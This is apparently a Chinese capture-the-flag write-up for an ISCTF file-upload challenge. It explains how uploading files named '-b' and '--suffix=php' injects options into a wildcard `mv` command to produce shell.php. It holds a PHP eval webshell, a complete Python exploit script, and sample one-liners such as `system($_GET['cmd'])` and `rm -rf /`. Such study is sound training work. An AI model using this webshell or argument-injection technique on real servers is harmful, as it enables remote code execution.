---
title: "ISCTF MV的救赎"
image: '/images/139294234_p0_master1200.jpg'
pinned: false
comment: true
published: 2026-02-01
description: "学习"
category: 学习
tags: [学习]
---

此篇文章专注于对php中 **`mv`** 这个知识在遇到题目中的利用，并适当延伸让自己学会。

题目就是标题中 **`ISCTF`** 中遇到的。

![image-20260215204812309](/images/image-20260215204812309.png)

这一题的考点专注于文件上传以及对mv的理解。

正常做法应该是通过抓取源码发现 **`mv`** 这个漏洞点，我们还原一下。

![image-20260215205456067](/images/image-20260215205456067.png)

通过扫描后端的工具disearch发现题目源码，下载下来，进行代码审计。

```
<?php
$uploadDir = '/tmp/upload/'; // 临时目录
$targetDir = '/var/www/html/upload/'; // 存储目录

$blacklist = [
    'php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'phps', 'pht','jsp', 'jspa', 'jspx', 'jsw', 'jsv', 'jspf', 'jtml','asp', 'aspx', 'ascx', 'ashx', 'asmx', 'cer', 'aSp', 'aSpx', 'cEr', 'pHp','shtml', 'shtm', 'stm','pl', 'cgi', 'exe', 'bat', 'sh', 'py', 'rb', 'scgi','htaccess', 'htpasswd', "php2", "html", "htm", "asa", "asax",  "swf","ini"
];

$message = '';
$filesInTmp = [];

// 创建目标目录
if (!is_dir($targetDir)) {
    mkdir($targetDir, 0755, true);
}

if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

// 上传临时目录
if (isset($_POST['upload']) && !empty($_FILES['files']['name'][0])) {
    $uploadedFiles = $_FILES['files'];
    foreach ($uploadedFiles['name'] as $index => $filename) {
        if ($uploadedFiles['error'][$index] !== UPLOAD_ERR_OK) {
            $message .= "文件 {$filename} 上传失败。<br>";
            continue;
        }

        $tmpName = $uploadedFiles['tmp_name'][$index];

        $filename = trim(basename($filename));
        if ($filename === '') {
            $message .= "文件名无效，跳过。<br>";
            continue;
        }

        $fileParts = pathinfo($filename);
        $extension = isset($fileParts['extension']) ? strtolower($fileParts['extension']) : '';

        $extension = trim($extension, '.');

        if (in_array($extension, $blacklist)) {
            $message .= "文件 {$filename} 因类型不安全（.{$extension}）被拒绝。<br>";
            continue;
        }

        $destination = $uploadDir . $filename;

        if (move_uploaded_file($tmpName, $destination)) {
            $message .= "文件 {$filename} 已上传至 $uploadDir$filename 。<br>";
        } else {
            $message .= "文件 {$filename} 移动失败。<br>";
        }
    }
}

// 获取临时目录中的所有文件
if (is_dir($uploadDir)) {
    $handle = opendir($uploadDir);
    if ($handle) {
        while (($file = readdir($handle)) !== false) {
            if (is_file($uploadDir . $file)) {
                $filesInTmp[] = $file;
            }
        }
        closedir($handle);
    }
}

// 处理确认上传完毕（移动文件）
if (isset($_POST['confirm_move'])) {
    if (empty($filesInTmp)) {
        $message .= "没有可移动的文件。<br>";
    } else {
        $output = [];
        $returnCode = 0;
        exec("cd $uploadDir ; mv * $targetDir 2>&1", $output, $returnCode);
        if ($returnCode === 0) {
            foreach ($filesInTmp as $file) {
                $message .= "已移动文件: {$file} 至$targetDir$file<br>";
            }
        } else {
            $message .= "移动文件失败: " .implode(', ', $output)."<br>";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>多文件上传服务</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .container { max-width: 800px; margin: auto; }
        .alert { padding: 10px; margin: 10px 0; background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .success { background: #d4edda; color: #155724; border-color: #c3e6cb; }
        ul { list-style-type: none; padding: 0; }
        li { margin: 5px 0; padding: 5px; background: #f0f0f0; }
    </style>
</head>
<body>
<div class="container">
    <h2>多文件上传服务</h2>

    <?php if ($message): ?>
        <div class="alert <?= strpos($message, '失败') ? '' : 'success' ?>">
            <?= $message ?>
        </div>
    <?php endif; ?>

    <form method="POST" enctype="multipart/form-data">
        <label for="files">选择文件：</label><br>
        <input type="file" name="files[]" id="files" multiple required>
        <button type="submit" name="upload">上传到临时目录</button>
    </form>

    <hr>

    <h3>待确认上传文件</h3>
    <?php if (empty($filesInTmp)): ?>
        <p>暂无待确认上传文件</p>
    <?php else: ?>
        <ul>
            <?php foreach ($filesInTmp as $file): ?>
                <li><?= htmlspecialchars($file) ?></li>
            <?php endforeach; ?>
        </ul>
        <form method="POST">
            <button type="submit" name="confirm_move">确认上传完毕，移动到存储目录</button>
        </form>
    <?php endif; ?>
</div>
</body>
</html>
```

```
$blacklist = [
    'php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'phps', 'pht','jsp', 'jspa', 'jspx', 'jsw', 'jsv', 'jspf', 'jtml','asp', 'aspx', 'ascx', 'ashx', 'asmx', 'cer', 'aSp', 'aSpx', 'cEr', 'pHp','shtml', 'shtm', 'stm','pl', 'cgi', 'exe', 'bat', 'sh', 'py', 'rb', 'scgi','htaccess', 'htpasswd', "php2", "html", "htm", "asa", "asax",  "swf","ini"
];
```

这个黑名单基本排除了我们能让题目进行文件执行的所有文件后缀，但留下了一个 **`phar`** ，这个后缀不在目录里，我们稍微展开一下。

> https://blog.csdn.net/beyond__devil/article/details/54986920

![image-20260215205920513](/images/image-20260215205920513.png)

简单理解这个就是一个php的大包，可以将多个php文件打包在一起，但是有区别于压缩包，压缩包需要解压后才能使用里面的文件，而phar是可以直接当作命令使用的，它是一个特殊的php文件类型。

但是其实这个phar后缀留下了，但也做不了题目，漏洞点在题目源码中，不过先对黑名单内的其他文件后缀做一下了解。



---





### PHP版本理解(运用ai与搜索引擎)	个人总结版

> https://www.cnblogs.com/daisy-fang/p/18712766

> https://www.cnblogs.com/yjf512/p/3588466.html

| **版本阶段**      | **核心变化**                                                 | **功能**                                                     |
| ----------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **PHP 3**         | 支持自定义函数，能连数据库。                                 | 可以和 MySQL、Oracle 这种数据库说话了。                      |
| **PHP 4**         | 运行速度更快，可用的便捷函数更多，相较于PHP 3 ，在操作上不那么痛苦了，但还是挺痛苦的 | 引入了 `$_GET`, `$_POST`, `$_SESSION`, `$_COOKIE`, `$_SERVER` 等，可以实现一些现代PHP的功能了。 |
| **PHP 5.0 - 5.3** | 引入了完整的 **1.面向对象（OOP）**，可以设计复杂的系统了。   | 终于可以有两个相同名字的函数了，指可以划定自定义函数的应用范围，从而不出现错误。引入了 `try`、`throw`、`catch`的机制，使得程序报错时可以看到错误而不是弹个错误后直接退出程序。 |
| **PHP 5.4 - 5.6** | 增加许多的便捷写法，整体没有大变                             | 比如，写数组不用写 `array()`，直接写 `[]` 就行。             |
| **PHP 7.0 - 7.3** | 引擎优化后，程序的内存占用大大减少，大部分的无用复制操作均被删去了。 | 出现了 ` ??` 空接合操作，使得写代码时能够更加方便，少重复不必要的操作。 |
| **PHP 7.4**       | 同样的性能优化，但 **2.PHP 7.4能够规定专用格式。**           | **3. 箭头函数 `fn() =>`**  简化代码写法。                    |
| **PHP 8.0**       | 代码的要求严格了些，构造函数简化了，传参上可以只传我们指定的参数，其他为默认，而不需要手动输入默认，出现了JIT (Just-In-Time) 编译器，可以保存已经计算过的结果。 | `match` 语句代替了麻烦的 `switch` 语句，传参更灵活。运算符 `?->`简化了许多操作。 |
| **PHP 8.1 - 8.2** | 实际代码变得更加规范，出现了只读类和隐私类的部分。           | **枚举** 固定选项列表（比如：性别只能是男/女，不能乱填）。   |
| **PHP 8.3 - 8.4** | 微调优化，引入了属性钩子和一些新函数。                       | **属性钩子 (Hooks)** 给变量赋值时自动触发逻辑，不用写繁琐的操作。有了一些方便的简单函数，类似 **数组查找函数 (Array Find)** 。 |

**注：**

**1.面向对象**：具体总结就是模块，类似库函数，比如我可以写好一套设定好的程序，然后建立一个东西直接引用这套程序，省时省力，不需要像之前一样一样做两个同样的东西需要两套完整的一模一样的代码。例子会在之后做统一整理的时候加上，这里仅做补充说明。

**2.PHP 7.4能够规定专用格式**：在本次版本之前，我们无法规定一些具体的格式，比如：`public $age` ，老版本可以往age里面存任何东西，储存本身不会报错，PHP 7.4之后，我们就可以限定age必须是整数的格式。

**3.箭头函数 `fn() =>`**：

```
$newNums = array_map(function ($n) {
    return $n * 2;
```

相较于以前对数据进行两倍计算需要完整的函数，PHP .7.4可以利用箭头函数简化写法：

```
$newNums = array_map(fn($n) => $n * 2, $nums);
```

**4.PHP后面的数字**：其实只是一个后缀，只要编译器不被影响，就可以把php8或者php3都看作php，当然了，如果电脑不看内容直接看后缀并且识别后缀，那自然就执行不了了。

**eg：**

| **操作**                        | **服务器环境** | **能否运行？** | **为什么？**                                                 |
| ------------------------------- | -------------- | -------------- | ------------------------------------------------------------ |
| **写现代 PHP代码 + 命名 .php3** | 现代 PHP       | **看运气**     | 代码本身没问题，但服务器可能不把 `.php3` 当程序看，只当文本看。(关键在于我们的电脑认不认或者远程环境认不认) |
| **写老的 PHP代码 + 命名 .php3** | 现代 PHP       | **报错**       | 虽然服务器愿意跑，但内容的代码已经过时了，现代引擎不兼容老的php语法。 |
| **写老的 PHP代码 + 命名 .php3** | 老板本 PHP 3   | **运行**       | 只有在当时那个版本，php3的代码才能发挥功能。                 |



### 其他后缀：



| **后缀**       | **简述**                                                | **代码举例 **                             |
| -------------- | ------------------------------------------------------- | ----------------------------------------- |
| **phtml**      | PHP 的 HTML 模板文件，会被执行。                        | `<h1><?php echo "Hello"; ?></h1>`         |
| **phps**       | PHP 源码显示，通常用于展示高亮代码，实际操作中可以代替/ | `<?php $pass="123"; // 泄露源码`          |
| **pht**        | PHP 另一种常见的模板扩展名。                            | `<?php system($_GET['cmd']); ?>`          |
| **jsp**        | Java 的动态网页文件，类似phtml的类型。                  | `<% out.println("Java Web"); %>`          |
| **jspa**       | 映射到特定 Java Servlet 的后缀。                        | `<%@ page import="java.util.*" %>`        |
| **jspx**       | XML 格式的 JSP 文件。                                   | `<jsp:root ...> <jsp:scriptlet> ...`      |
| **jsw**        | Java Servlet 网页（较少见）。                           | *同 JSP 逻辑*                             |
| **jsv**        | Java Servlet 校验页面。                                 | *同 JSP 逻辑*                             |
| **jspf**       | JSP 分段文件（用于包含进主页面）。                      | `<p>被包含的内容</p>`                     |
| **jtml**       | 早期混合了 Java 的 HTML 格式。                          | `<html><% ... %></html>`                  |
| **asp**        | 微软早期的动态服务器页面（VBScript）。                  | `<% Response.Write("Hello ASP") %>`       |
| **aspx**       | 现代 .NET 框架的动态页面。                              | `<script runat="server"> ... </script>`   |
| **ascx**       | .NET 的用户自定义控件。                                 | `<%@ Control Language="C#" ... %>`        |
| **ashx**       | .NET 的一般处理程序（常用于写木马）。                   | `public void ProcessRequest(...) { ... }` |
| **asmx**       | .NET 的 Web Service 接口。                              | `[WebMethod] public string Hello() ...`   |
| **cer**        | 证书文件，但在旧 IIS 中会按 ASP 执行。                  | `<% shell.run(...) %>` (藏在证书里)       |
| **aSp / pHp**  | 大小写变形，用于绕过不规范的黑名单。                    | `<?PhP echo "绕过成功"; ?>`               |
| **shtml**      | 支持服务端包含 (SSI) 的 HTML。                          | `` (执行命令)                             |
| **shtm**       | shtml 的缩写形式。                                      | *同 shtml 逻辑*                           |
| **stm**        | 另一种支持 SSI 的 HTML 文件。                           | *同 shtml 逻辑*                           |
| **pl / py**    | Perl 和 Python 脚本。                                   | `print("Hello from Python")`              |
| **cgi**        | 通用网关接口脚本（由系统执行）。                        | `#!/usr/bin/perl ...`                     |
| **exe / bat**  | Windows 的可执行程序或批处理文件。                      | `@echo off ...` (系统操作)                |
| **sh**         | Linux/Unix 的 Shell 脚本。                              | `#!/bin/bash \n rm -rf /`                 |
| **htaccess**   | **Apache 分布式配置文件 (高危)**。                      | `AddType application/x-httpd-php .jpg`    |
| **htpasswd**   | 存储 Apache 访问密码的文件。                            | `admin:$apr1$72...` (加密后的密码)        |
| **html / htm** | 纯静态页面，但可用于 XSS 攻击。                         | `<script>alert('XSS')</script>`           |
| **asa / asax** | 全局配置或资源文件（ASP 家族）。                        | `<script language="VBScript"> ...`        |
| **swf**        | Flash 动画文件（现已过时，有安全隐患）。                | *(二进制二进制内容)*                      |
| **ini**        | 配置文件，可能泄露路径或系统参数。                      | `[database] user=root`                    |



----



### 回到题目上面来：

```
// 处理确认上传完毕（移动文件）
if (isset($_POST['confirm_move'])) {
    if (empty($filesInTmp)) {
        $message .= "没有可移动的文件。<br>";
    } else {
        $output = [];
        $returnCode = 0;
        exec("cd $uploadDir ; mv * $targetDir 2>&1", $output, $returnCode);
        if ($returnCode === 0) {
            foreach ($filesInTmp as $file) {
                $message .= "已移动文件: {$file} 至$targetDir$file<br>";
            }
        } else {
            $message .= "移动文件失败: " .implode(', ', $output)."<br>";
        }
    }
}
```

题目的源码出现的漏洞在这个mv上面。

> [linux常用命令(6)：mv命令(移动文件/目录)_linux mv移动文件到指定目录-CSDN博客](https://blog.csdn.net/weixin_49114503/article/details/132993612)

![image-20260218192812141](/images/image-20260218192812141.png)

这里便是mv作用的源头，因为我自己在做的时候我就意识到了一个做法，如果我上传一个shell文件，然后移动到目录中，在上传三个文件，一个shell文件，跟前面的shell文件名一模一样，一个是文件名为-b的文件，一个文件名为--suffix=php的文件，这样当我再次移动到目录中，因为采用的是mv的命令，前面我的目录中已经存在一个shell文件，再次移动时候由于文件存在，系统会做一个备份，因为我指定的shell文件，-b文件，--suffix=php文件的名字，正好组合成了linux系统的命令，这样边产生了文件碰撞并要备份文件，后缀名又被我指定为php。

最终文件就能碰撞出一个真正的shell.php的文件，形成木马上传。

思路很理想，跟wp也对，做过没做出来，你猜怎么着，我这个方法碰撞出的是shellphp文件，指定后缀并不会加点，也是服了。

之后便是将shell文件变成 xxx. 这样的格式，然后按照我的做法，产生文件碰撞就能在服务器上传shell了，之后便是执行命令寻找flag。

这题挺难得的，思路都对结果败在一个点上面，以后比赛要好好注意了。



---



### 这边对mv这个命令做一个掌握的总结：

mv用来移动或改名文件和目录

移动文件：将源文件移至一个目标文件中，或将一组文件移至一个目标目录中。

源文件被移至目标文件有两种不同的结果：

1.如果目标文件是目录，原文件会被移到此目录下。当目标文件是目录时，源文件或目录参数可以有多个，则所有的源文件都会被移至目标目录中。文件名保持不变。

2.如果目标文件不是目录，则原文件名（只能有一个）会变更为目标文件名，并覆盖己存在的同名文件。如果原文件和目标文件在同一个目录下，mv 的作用就是修改文件名。

cp跟mv还是有根源性不同的，cp是复制，而mv是移动。

mv [源文件] [目标路径]	**(使用方式)**

| **功能** | **参数** | **简单表述**                                                 |
| -------- | -------- | ------------------------------------------------------------ |
| **强制** | `-f`     | 直接覆盖，不论存不存在。                                     |
| **询问** | `-i`     | 如果有，询问一下是否覆盖。                                   |
| **跳过** | `-n`     | 存在了就不移动了。                                           |
| **备份** | `-b`     | 存在时备份一下，再移动。                                     |
| **更新** | `-u`     | 没有文件无所谓，存在时如果一样就不动，如果不一样，动旧不动新。 |
| **详细** | `-v`     | 详细给出命令执行时的过程。                                   |



---



### PAYLOAD：

```
import requests

url = "http://challenge.imxbt.cn:32396/"

def upload_file(filename, content):
    post_file = {
        "files[]": (filename, content, "application/octet-stream")
    }
    post_data = {"upload": "1"}
    res = requests.post(url, files=post_file, data=post_data)
    return res.text

def move_file():
    post_data = {"confirm_move": "1"}
    res = requests.post(url, data=post_data)
    return res.text

def rce(cmd):
    target_url = f"{url}/upload/shell.php"
    res = requests.post(target_url, data={"cmd": cmd})
    return res.text

if __name__ == "__main__":
    shell_content = b"<?php eval($_POST['cmd']); ?>"

    upload_file("shell.", shell_content)
    move_file()

    upload_file("shell.", shell_content)
    upload_file("-b", b"")
    upload_file("--suffix=php", b"")

    move_file()

    flag = rce("system('cat /flag');")
    
    if flag:
        print(flag)
    else:
        print("Error")
```



----

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
